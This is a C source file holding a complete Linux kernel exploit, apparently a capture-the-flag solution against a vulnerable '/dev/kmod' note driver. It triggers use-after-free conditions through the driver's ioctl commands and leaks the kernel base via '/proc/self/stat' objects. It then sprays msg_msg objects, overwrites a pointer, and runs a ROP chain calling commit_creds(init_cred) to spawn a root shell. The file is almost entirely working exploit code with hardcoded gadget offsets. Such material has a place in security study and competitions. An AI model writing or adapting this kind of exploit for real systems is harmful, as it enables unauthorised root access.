#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>
#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/capability.h>
#include <linux/types.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif
u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
void get_shell()
{
    __asm__(
        "mov rsp, [rip+user_sp];"
        "mov rbp, rsp;"
        "add rbp, 0x80;");

    if (getuid())
    {
        errExit("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
}
void save_state()
{
    __asm__(
        "mov [rip+user_cs], cs;"
        "mov [rip+user_ss], ss;"
        "mov [rip+user_sp], rsp;"
        "pushf;"
        "pop qword ptr[rip+user_rflags];");
    user_ip = (u64)get_shell;
    logInfo("Saved user state");
}

__attribute__((optimize(0))) int64_t ioctl(int fd, int cmd, int64_t argv)
{
    __asm__("mov rax, 0x10");
    __asm__("syscall");
}

#define DEVFILE "/dev/kmod"

int devfd;

static inline int opendev()
{
    return open(DEVFILE, O_RDONLY);
}

struct Req
{
    uint64_t size;
    uint64_t idx;
    uint64_t idx_cpy;
    int cmd;
    uint perm_rw;
    void *user_addr;
};
struct Node;
struct Data;

struct Node
{
    ulong size;
    uint priv_read;
    uint priv_write;
    void *addr;
    struct Data *data;
};

struct Data
{
    struct Data *next;
    struct Node *node;
    ulong val;
};

#define ADDNODE_CMD 0x13370000
#define USENODE_CMD 0x13370001
#define DELNODE_CMD 0x13370002

#define READ_PERM 1
#define WRITE_PERM 2

int64_t addnote(uint64_t idx, uint64_t size, uint perm)
{
    struct Req req = {0};
    req.size = size;
    req.idx = idx;
    req.perm_rw = perm;
    return ioctl(devfd, ADDNODE_CMD, &req);
}

int64_t addcow_note(uint64_t idx, uint64_t idx_cpy, uint perm, size_t size)
{
    struct Req req = {0};
    req.idx = idx;
    req.idx_cpy = idx_cpy;
    req.cmd = 0x13380002;
    req.perm_rw = perm;
    req.size = size;
    return ioctl(devfd, ADDNODE_CMD, &req);
}

int64_t readnote(uint64_t idx, void *addr, uint64_t size)
{
    struct Req req = {0};
    req.cmd = 0x13380000;
    req.idx = idx;
    req.size = size;
    req.perm_rw = 1;
    req.user_addr = addr;

    return ioctl(devfd, USENODE_CMD, &req);
}

int64_t writenote(uint64_t idx, void *addr, uint64_t size)
{
    struct Req req = {0};
    req.cmd = 0x13380001;
    req.idx = idx;
    req.size = size;
    req.perm_rw = 1;
    req.user_addr = addr;

    return ioctl(devfd, USENODE_CMD, &req);
}

int64_t delnote(uint64_t idx)
{
    struct Req req = {0};
    req.idx = idx;

    return ioctl(devfd, DELNODE_CMD, &req);
}

#define MSGMSG_HEADER_SIZE 0x30UL
#define DATALEN_MSG (0x1000 - MSGMSG_HEADER_SIZE)
#define MSGMSG_SIZE 0x20
struct msgmsg20
{
    long mtype;
    char mtext[(MSGMSG_HEADER_SIZE + DATALEN_MSG) + MSGMSG_SIZE - 8]; //
};

/**
 * @brief kmalloc-32 for struct msg-msg
 * @param msg `struct msgmsg20`
 * @param num
 *
 * @return int
 */
int allocate_msgmsg20(struct msgmsg20 *msg, int num)
{
    memset(&msg->mtext, 'A', sizeof(msg->mtext));

    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    for (int ix = 0; ix != num; ++ix)
    {
        if (msgsnd(qid, msg, sizeof(msg->mtext) - MSGMSG_HEADER_SIZE, 0) < 0)
            errExit("msgsnd");
    }
    return qid;
}
struct msgmsg20 msg = {.mtype = 1};

uint64_t kbase;
uint64_t init_cred;
uint64_t commit_creds;

void pwn(int stat_fd)
{
    __asm__(
        "mov r14, %0 ;"              // pop rdi ; ret
        "mov r13, [rip+init_cred] ;" // NULL
        "mov r12, [rip+commit_creds] ;"
        "mov rbp, %1 ;"                     // pop rcx ; pop rbp ; ret
        "lea rbx, [rip + get_shell + 27] ;" // user_ip
        "mov r11, %2 ;"                     //
        "mov r10, %3;"                      // sysret + 69
        "mov rdx, 0x4343;"
        "mov rsi, 0x4242;"
        "xor eax, eax; "
        "syscall;"
        :
        : "r"(kbase + 0x1042ad), "r"(kbase + 0x6a81ff), "r"(kbase + 0x319d55), "r"(kbase + 0x80017c));
}

int main(int argc, char **argv, char **envp)
{
    save_state();
    devfd = opendev();
    if (devfd < 0)
    {
        errExit("main::opendev");
    }
    addnote(10, 0x20, 1);
    addnote(0, 0x2e0, 1);

    delnote(0);

    addcow_note(0, 0xe, READ_PERM, 0x10);
    addnote(1, 0x20, 1);
    delnote(1);

    int stat_fds[10];

    for (uint64_t i = 0; i < 10; ++i)
    {
        stat_fds[i] = open("/proc/self/stat", O_RDONLY);
    }

    uint64_t *buf = (uint64_t *)calloc(1, 0x30);

    readnote(0, buf, 0x30);

    logOK("single_start @ 0x%lx", buf[0]);

    kbase = buf[0] - 0x193be0;
    commit_creds = kbase + 0x7d800;
    init_cred = kbase + 0xe384c0;

    for (uint64_t i = 0; i < 10; ++i)
    {
        close(stat_fds[i]);
    }

    addcow_note(1, 0, WRITE_PERM, 0x10);
    delnote(1);
    addcow_note(1, 0xe, WRITE_PERM, 0x10);
    int stat = open("/proc/self/stat", O_RDONLY);
    addcow_note(3, 10, WRITE_PERM, 0x20);
    delnote(1);

    allocate_msgmsg20(&msg, 1);
    /*
pwndbg> x/10i 0xffffffff810eb6c5
   0xffffffff810eb6c5 <__bpf_prog_run_args416+149>:     add    rsp,0x208
   0xffffffff810eb6cc <__bpf_prog_run_args416+156>:     pop    rbx
   0xffffffff810eb6cd <__bpf_prog_run_args416+157>:     pop    r12
   0xffffffff810eb6cf <__bpf_prog_run_args416+159>:     pop    rbp
   0xffffffff810eb6d0 <__bpf_prog_run_args416+160>:     jmp    0xffffffff81a00620 <__x86_return_thunk>
   0xffffffff810eb6d5 <__bpf_prog_run_args416+165>:     call   0xffffffff816cacb0 <__stack_chk_fail>
   0xffffffff810eb6da <__bpf_prog_run_args416+170>:     nop    WORD PTR [rax+rax*1+0x0]
   0xffffffff810eb6e0 <__bpf_prog_run_args384>: push   rbp
   0xffffffff810eb6e1 <__bpf_prog_run_args384+1>:       mov    r11,rdi
   0xffffffff810eb6e4 <__bpf_prog_run_args384+4>:       mov    r10,rcx
pwndbg> x/10i 0xffffffff81a00620
   0xffffffff81a00620 <__x86_return_thunk>:     jmp    0xffffffff81a00580 <__ret>
   0xffffffff81a00625 <__x86_return_thunk+5>:   int3
    */
    uint64_t p = kbase + 964293;
    writenote(3, &p, 8);
    pwn(stat);
}